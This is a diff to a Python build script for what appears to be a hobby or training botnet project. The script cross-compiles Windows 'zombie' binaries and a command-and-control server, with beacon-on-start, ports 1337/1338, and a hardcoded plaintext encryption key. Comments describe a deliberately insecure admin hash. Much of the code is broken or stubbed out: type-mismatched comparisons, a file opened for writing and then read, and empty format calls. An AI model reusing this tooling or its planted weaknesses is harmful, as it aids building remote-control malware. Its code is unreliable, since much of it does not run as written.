@@ -56,16 +56,16 @@ parser.add_argument('--hosttarget',
                                  action  = "store" ,
                                  default = "" ,
                                  help    = "" )
-parser.add_argument('--',
-                                 dest    = '',
+parser.add_argument('--zombieIP',
+                                 dest    = 'zombieIO',
                                  action  = "store" ,
                                  default = '' ,
-                                 help    = "" )
-parser.add_argument('--',
-                                 dest    = '',
+                                 help    = "It's up to you to know the value to set this to" )
+parser.add_argument('--hostIP',
+                                 dest    = 'hostIP',
                                  action  = "store" ,
                                  default = '/' ,
-                                 help    = "" )
+                                 help    = "IP address for the Command And Control Server" )
 
 try:
     import colorama
@@ -78,7 +78,7 @@ except ImportError as derp:
     print("[-] NO COLOR PRINTING FUNCTIONS AVAILABLE, Install the Colorama Package from pip")
     COLORMEQUALIFIED = False
 
-# Never had to do this before
+# Never had to do this before, all the way up here!
 if __name__ == "main":
     arguments = parser.parse_args()
 ################################################################################
@@ -97,16 +97,16 @@ possible_targets = {"windows": ["386","amd64","arm"],
                     }
 # TO BUILD FOR A DIFFERENT OS/ARCH
 # CGO_ENABLED MUST BE SET TO "0"
+# this should probably be done when building a windows zombie from a linux host
 CGOENV = 'CGO_ENABLED'# ="1"
-# set the folloiwing ENV vars to build specific targets
+# set the following ENV vars to build specific targets
 # otherwise GO compiler defaults to host specs
 # this should be set to the platform you want to build the binary for
 BUILD_TARGET_OS      = "windows"
 BUILD_TARGET_ARCH    = "amd64"
-wat = possible_targets.get(BUILD_TARGET_OS) 
-                                # HONK!
-env_var_target_os    = os.environ["GOOS"]   = BUILD_TARGET_OS
-env_var_target_arch  = os.environ["GOARCH"] = BUILD_TARGET_ARCH
+        # HONK!
+os.environ["GOOS"]   = BUILD_TARGET_OS
+os.environ["GOARCH"] = BUILD_TARGET_ARCH
 # add entries as necessary to reflect go.mod file entries
 PROJECT_DEPENDENCIES = ["github.com/fatih/color",
                         "github.com/hashicorp/mdns",
@@ -118,49 +118,26 @@ PROJECT_DEPENDENCIES = ["github.com/fatih/color",
 ###############################################################################
 #                            GLOBALS TO MODIFY
 ###############################################################################
-# I want to modify some variables in the globals file 
+# I want to modify some variables in the globals file  net.IP
 # so we can compile custom binaries from generic code
 # holding initial critical information
 GLOBALS_FILE      = PROJECT_DIRECTORY + SHARED_CODE_DIRECTORY
-globals_to_modify =  {BEACON_ON_START
+globals_to_modify =  {"BEACON_ON_START bool"  : "True",
                         # can be one of four options, http, tcp, udp, dns
-                        var BACON_TYPE string = "tcp"
-                        # WE ARE LOCAL, ZOMBIE IS REMOTE!
-                        commandIP net.IP = net.ParseIP("192.168.0.2")
-                    TCPPORT int = 1337
-                        UDPPORT int = 1338
-                        Local_tcpaddr_LAN net.TCPAddr = net.TCPAddr{IP: commandIP, Port: TCPPORT}
-                        Local_udpaddr_LAN net.UDPAddr = net.UDPAddr{IP: commandIP, Port: UDPPORT}
-                        Local_tcpaddr_WAN net.TCPAddr
-                        Local_udpaddr_WAN net.UDPAddr
-                        var Remote_tcpport string = ":1337"
-                        var Remote_tcpaddr string = "192.168.0.2" + Remote_tcpport
-                        var Remote_udpport string = ":1338"
-                        var Remote_udpaddr string = Remote_tcpaddr + Remote_udpport
-                        var Remote_http_addr string
-                        var Remote_ftp_addr string
-                        var Remote_dns_addr string
-                        var PHONEHOME_TCP net.TCPAddr
-                        var PHONEHOME_UDP net.UDPAddr
-
-//-----NAME-------------TYPE-----
-var Mega_important_encryption_key string
-
-// Admin Password in an obvious place
-// TODO: set these for "hardmode" section
-var Sha256_admin_pass_preencrypted crypto.Hash
-var Sha512_admin_pass_preencrypted crypto.Hash
-
-// Horribly insecure implementation
-var Sha256_hash_admin crypto.Hash
-var New_admin_hash = Sha256_hash_admin.New()
-var Wat = New_admin_hash.Sum([]byte("admin"))
-
-// multi-cast DNS Server. for LAN communication
-var Mdns_server mdns.Server
-
-
-}
+                        "var BACON_TYPE string": "tcp",
+                        "var ipstr string"     : arguments.hostIP,
+                        # You could maybe add options to change this
+                        "var TCPPORT int"          : "1337",
+                        "var UDPPORT int"          : "1338",
+                        "var Remote_tcpport"   :":1337",
+                        "var Remote_udpport"   :":1338",
+                        "var Remote_tcpaddr"   :arguments.zombieIP,
+                        # it's usually more complicated than this ;)
+                        "var Remote_http_addr" : arguments.zombieIP,
+                        "var Remote_ftp_addr"  : arguments.zombieIP,
+                        "var Remote_dns_addr"  : arguments.zombieIP,
+                        "var Mega_important_encryption_key" : "PLAINTEXTHAHA"
+                    }
 
 LOGLEVEL            = 'DEV_IS_DUMB'
 LOGLEVELS           = [1,2,3,'DEV_IS_DUMB']
@@ -247,21 +224,27 @@ Enter your selection using a single integer:
         # yes I validate like a fool
         # users are foolish
         if str.isdigit(menu_selection) and (len(menu_selection) == 1) and menu_selection > 4:
-            if menu_selection   ==1:
-                self.init_project()
-            elif menu_selection == 2:
-                self.install_dependencies()
-            elif menu_selection == 3:
-                self.build_zombie_for_target()
-            elif menu_selection == 4:
+            if menu_selection   =="1":
+                pass # self.init_project()
+            elif menu_selection == "2":
+                pass # self.install_dependencies()
+            elif menu_selection == "3":
+                pass # self.build_zombie_for_target()
+            elif menu_selection == "4":
                 pass
     
     def edit_globals(self, globals_file = GLOBALS_FILE):
         file_to_modify = open(globals_file, "w")
+        globals_dict = {}
         for each_line in file_to_modify.readlines():
             # ignore comments...
-            if each_line.startswith(any("//","/*","/*","var"))
-
+            if each_line.startswith("var "):
+                # you should remove this if you want the code to compile ;)
+                each_line.strip(["a", "e", "s"])
+                # matches the line of code to item in the dictionary
+                if each_line == any(globals_dict.keys()):
+                    each_line.replace(globals_dict)
+                    
 
 
     def init_project(self):
@@ -274,18 +257,19 @@ Enter your selection using a single integer:
             for dependency_url in PROJECT_DEPENDENCIES:
                 exec_command("go get {}".format(dependency_url))
 
-    def build_zombie_for_target(self, target_arch: str, target_os : str):
+    def build_zombie_for_target(self,name, target_arch: str, target_os : str):
         '''fed with values from the variables at the top of this file '''
         os.chdir(TARGET_SRC_DIRECTORY)
-        exec_command("go build {}".format())
+        exec_command("go build {}{}-o {} ".format())
     
     def build_command_center(self, name):
         '''Builds command center/server for THIS MACHINE '''
-        #this will be broken HARD
         # set env vars
-        BUILD_TARGET_OS      = "linux"
-        BUILD_TARGET_ARCH    = "amd64"
+        # BUILD_TARGET_OS      = "linux"
+        # BUILD_TARGET_ARCH    = "amd64"
         os.chdir(COMMAND_SRC_DIRECTORY)
+        os.environ["GOOS"]   = BUILD_TARGET_OS
+        os.environ["GOARCH"] = BUILD_TARGET_ARCH
         exec_command("go build {} -o {}".format(name))
 
 try:    
